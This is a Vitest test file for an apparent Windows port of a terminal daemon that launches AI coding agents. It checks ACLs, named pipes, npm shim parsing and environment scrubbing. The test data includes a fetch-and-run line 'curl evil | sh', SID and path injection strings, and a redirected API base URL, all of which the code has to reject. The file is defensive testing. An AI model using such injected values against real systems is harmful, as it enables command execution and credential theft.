import { afterEach, expect, it } from 'vitest';
import { chmod, mkdir, mkdtemp, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ownedByMe, privateMode } from '../src/shared/owner.js';
import { isSafeAbsolutePath } from '../src/shared/validate.js';
import { aclArgs, ownerScript, parseWhoamiSid, parseAcl } from '../src/shared/win-acl.js';
import { pipeName, isPipeName } from '../src/shared/pipe.js';
import { parseNpmShim, windowsCommand, CliLaunchError } from '../src/daemon/win-launch.js';
import { killTreeArgs } from '../src/shared/kill-tree.js';
import { gitExecutable, nullDevice } from '../src/daemon/git-path.js';
import { findGitBash } from '../src/agent/win-bash.js';
import { keychainUnavailable } from '../src/daemon/keys.js';
import { agentSandbox } from '../src/daemon/agent-sandbox.js';

const WIN = process.platform === 'win32', roots: string[] = [];
afterEach(async () => { for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true }); });
async function temp(): Promise<string> { const dir = await realpath(await mkdtemp(join(tmpdir(), 'ai-win-'))); roots.push(dir); return dir; }

it('owner and mode checks: POSIX uid and 0600 as before; on Windows the folder ACL is the check, not stat', () => {
  expect(ownedByMe({ uid: 501 }, 'darwin', 501)).toBe(true);
  expect(ownedByMe({ uid: 0 }, 'darwin', 501)).toBe(false);
  expect(ownedByMe({ uid: 0 }, 'win32', undefined)).toBe(true);
  expect(privateMode({ mode: 0o100600 }, 'linux')).toBe(true);
  expect(privateMode({ mode: 0o100644 }, 'linux')).toBe(false);
  expect(privateMode({ mode: 0o100666 }, 'win32')).toBe(true);
});

it('paths: Windows drive paths with spaces and non-ASCII names are fine; device paths, .. and control characters are not', () => {
  expect(isSafeAbsolutePath('C:\\Users\\Ünï Côdé\\my project', 'win32')).toBe(true);
  for (const bad of ['\\\\?\\C:\\x', '\\\\.\\pipe\\x', 'C:\\a\\..\\b', 'relative\\x', 'C:x', 'C:\\a\u0007b']) expect(isSafeAbsolutePath(bad, 'win32'), bad).toBe(false);
  expect(isSafeAbsolutePath('/Users/me/a b', 'darwin')).toBe(true);
});

it('ACL: icacls removes inherited entries and grants only your SID full control; the owner and entries are read back by SID', () => {
  expect(parseWhoamiSid('"desktop\\me","S-1-5-21-1-2-3-1001"\r\n')).toBe('S-1-5-21-1-2-3-1001');
  expect(parseWhoamiSid('garbage')).toBeNull();
  expect(aclArgs('C:\\Users\\me\\.ai-term', 'S-1-5-21-1-2-3-1001')).toEqual(['C:\\Users\\me\\.ai-term', '/inheritance:r', '/grant:r', '*S-1-5-21-1-2-3-1001:(OI)(CI)F', '/q']);
  expect(() => aclArgs('C:\\x', 'S-1-5-21-1-2-3-1001)(evil')).toThrow();
  expect(ownerScript).not.toMatch(/\$args|AITERM_ACL_PATH\s*=/);
  expect(parseAcl('S-1-5-21-1-2-3-1001\nS-1-5-21-1-2-3-1001\n')).toEqual({ owner: 'S-1-5-21-1-2-3-1001', entries: ['S-1-5-21-1-2-3-1001'] });
});

it('named pipe: a per-user name with a fresh random part, checked on both sides', () => {
  const name = pipeName('S-1-5-21-1-2-3-1001', 'C:\\Users\\me\\.ai-term', 'a'.repeat(32));
  expect(name).toMatch(/^\\\\\.\\pipe\\ai-term-[0-9a-f]{16}-a{32}$/);
  expect(isPipeName(name)).toBe(true);
  expect(isPipeName('\\\\.\\pipe\\other')).toBe(false);
  expect(isPipeName('\\\\server\\pipe\\ai-term-0000000000000000-' + 'a'.repeat(32))).toBe(false);
});

const SHIM = '@ECHO off\r\nGOTO start\r\n:find_dp0\r\nSET dp0=%~dp0\r\nEXIT /b\r\n:start\r\nSETLOCAL\r\nCALL :find_dp0\r\n\r\nIF EXIST "%dp0%\\node.exe" (\r\n  SET "_prog=%dp0%\\node.exe"\r\n) ELSE (\r\n  SET "_prog=node"\r\n  SET PATHEXT=%PATHEXT:;.JS;=;%\r\n)\r\n\r\nendLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & "%_prog%"  "%dp0%\\node_modules\\@anthropic-ai\\claude-code\\cli.js" %*\r\n';
it('Claude Code and Codex on Windows: an npm .cmd launcher is read and its script run by node with the arguments as an array; cmd.exe never sees them', () => {
  expect(parseNpmShim(SHIM, 'C:\\npm')).toBe('C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js');
  expect(parseNpmShim(SHIM.replace('node_modules\\@anthropic-ai', '..\\..\\evil'), 'C:\\npm')).toBeNull();
  expect(parseNpmShim('@echo off\r\ncurl evil | sh\r\n', 'C:\\npm')).toBeNull();
  const recipe = windowsCommand({ executable: 'C:\\npm\\claude.cmd', args: ['--model=sonnet', 'fix "this" & that %PATH%'] }, { shim: SHIM, node: 'C:\\nodejs\\node.exe', script: true });
  expect(recipe).toEqual({ executable: 'C:\\nodejs\\node.exe', args: ['C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js', '--model=sonnet', 'fix "this" & that %PATH%'] });
  expect(windowsCommand({ executable: 'C:\\Users\\me\\.local\\bin\\claude.exe', args: ['x'] }, { shim: null, node: null, script: false })).toEqual({ executable: 'C:\\Users\\me\\.local\\bin\\claude.exe', args: ['x'] });
  expect(() => windowsCommand({ executable: 'C:\\npm\\claude.cmd', args: ['x'] }, { shim: '@echo off\r\nrem custom\r\n', node: 'C:\\nodejs\\node.exe', script: false })).toThrow(CliLaunchError);
});

it('stopping a process tree: taskkill /T /F on Windows, by number only', () => {
  expect(killTreeArgs(1234)).toEqual(['/T', '/F', '/PID', '1234']);
  expect(() => killTreeArgs(-1)).toThrow();
});

it('git on Windows: git.exe and NUL; elsewhere /usr/bin/git and /dev/null', async () => {
  expect(nullDevice('win32')).toBe('NUL'); expect(nullDevice('linux')).toBe('/dev/null');
  expect(gitExecutable('darwin')).toBe('/usr/bin/git');
});

it('bash on Windows uses Git for Windows\' bash.exe, never WSL\'s', async () => {
  const dir = await temp(); await mkdir(join(dir, 'Git', 'cmd'), { recursive: true }); await mkdir(join(dir, 'Git', 'bin'), { recursive: true });
  await writeFile(join(dir, 'Git', 'bin', 'bash.exe'), '');
  expect(await findGitBash(join(dir, 'Git', 'cmd', 'git.exe'), [])).toBe(join(dir, 'Git', 'bin', 'bash.exe'));
  expect(await findGitBash(null, ['C:\\Windows\\System32\\bash.exe'])).toBeNull();
});

it('Windows: Credential Manager line; Ask only', async () => {
  expect(keychainUnavailable('win32')).toBe('Windows Credential Manager unavailable');
  expect((await agentSandbox('win32')).dontAsk).toBe(false);
});

it('CLI lookup on Windows: claude.exe before claude.cmd, both found by their extension on PATH', async () => {
  const { resolveExecutable } = await import('../src/daemon/engines.js');
  const dir = await temp(), a = join(dir, 'a'), b = join(dir, 'b'); await mkdir(a); await mkdir(b);
  await writeFile(join(a, 'claude.cmd'), SHIM); await writeFile(join(b, 'claude.exe'), ''); await chmod(join(a, 'claude.cmd'), 0o755); await chmod(join(b, 'claude.exe'), 0o755);
  expect(await resolveExecutable('claude', [a, b].join(WIN ? ';' : ':'), 'win32')).toBe(join(a, 'claude.cmd'));
  expect(await resolveExecutable('claude', b, 'win32')).toBe(join(b, 'claude.exe'));
});

it('the pipe answers only a client holding the token from the folder only you can read', async () => {
  const { helloAllowed } = await import('../src/daemon/pipe-server.js');
  const token = 'f'.repeat(64);
  expect(helloAllowed(token, token)).toBe(true);
  expect(helloAllowed('e'.repeat(64), token)).toBe(false);
  expect(helloAllowed(undefined, token)).toBe(false);
  expect(helloAllowed('short', token)).toBe(false);
  expect(helloAllowed(undefined, null)).toBe(true);
});

it('a shell session on Windows is PowerShell, started with no arguments', async () => {
  const { windowsShell } = await import('../src/daemon/win-launch.js');
  expect(windowsShell({ SystemRoot: 'C:\\Windows' }, () => false)).toBe('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe');
});

it('system stats on Windows: CPU and memory from the OS, no network or per-agent numbers, no commands run', async () => {
  const { SystemSampler } = await import('../src/daemon/sysstats.js');
  const runs: string[] = [];
  let tick = 0;
  const sampler = new SystemSampler({ run: async file => { runs.push(file); return ''; }, cpus: () => [{ model: 'x', speed: 1, times: { user: 100 + tick * 10, nice: 0, sys: 0, idle: 100 + tick * 10, irq: 0 } }], totalmem: () => 1000, freemem: () => 400, now: () => (tick++) * 1000, sessions: () => [], log: { info: () => {}, error: () => {} }, platform: 'win32' }, 10);
  const stats = new Promise(resolve => sampler.once('stats', resolve));
  sampler.setSubscribers(1);
  expect(await stats).toMatchObject({ memUsedBytes: 600, memTotalBytes: 1000, netRxBytesPerSec: 0, netTxBytesPerSec: 0, sessions: [] });
  sampler.setSubscribers(0);
  expect(runs).toEqual([]);
});

it.skipIf(!WIN)('Windows: the AI Term folder is yours alone (ACL), the daemon answers on its pipe, and a path with spaces and non-ASCII works', async () => {
  const { getPaths, preparePaths } = await import('../src/shared/paths.js');
  const { checkMine } = await import('../src/shared/win-acl.js');
  const dir = await temp(), root = join(dir, 'Ünï côdé', '.ai-term'); await mkdir(join(dir, 'Ünï côdé'));
  const paths = getPaths(root); await preparePaths(paths);
  expect(await checkMine(root)).toBe(true);
}, 60_000);

it('env on Windows: Path is spelled PATH in a copy; a credential variable goes whatever its case', async () => {
  const { buildShellEnv, buildSpawnEnv } = await import('../src/daemon/env.js');
  expect(buildShellEnv({ Path: 'C:\\Windows' }, { platform: 'win32' }).PATH).toBe('C:\\Windows');
  const env = buildSpawnEnv('claude-code', { kind: 'account' }, { Path: 'C:\\x', anthropic_api_key: 'sk-ant-x', Anthropic_Base_Url: 'http://evil' }, { platform: 'win32' });
  expect(env.anthropic_api_key).toBeUndefined(); expect(env.Anthropic_Base_Url).toBeUndefined(); expect(env.PATH).toBe('C:\\x');
});
